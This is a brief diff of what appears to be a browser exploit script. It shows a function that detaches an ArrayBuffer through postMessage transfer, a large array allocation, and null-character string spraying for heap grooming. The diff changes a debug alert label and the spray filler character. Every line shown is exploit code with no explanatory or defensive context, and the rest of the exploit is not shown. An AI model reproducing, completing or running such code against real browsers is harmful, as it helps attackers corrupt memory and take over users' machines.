@@ -1,5 +1,5 @@
 <script>
-alert("start_to_read1");
+alert("start_to_read2");
 var array=new Array(0x4000);
 function neuter(ab) {
     postMessage("", "*", [ab]);
@@ -34,7 +34,7 @@ tmp+="\u0000\u0000";
 for(var i=0;i<0x28;i++){
 tmp+="\u0000";
 }
-var tmpy = createStringWithRepeatedChar("2",(1 << 16) );
+var tmpy = createStringWithRepeatedChar("\u0000",(1 << 16) );
 x = createStringWithRepeatedChar(x, 1 << 16);
 x+="1";
 y=tmp+tmpy.substring(0,0x10000-0x50);
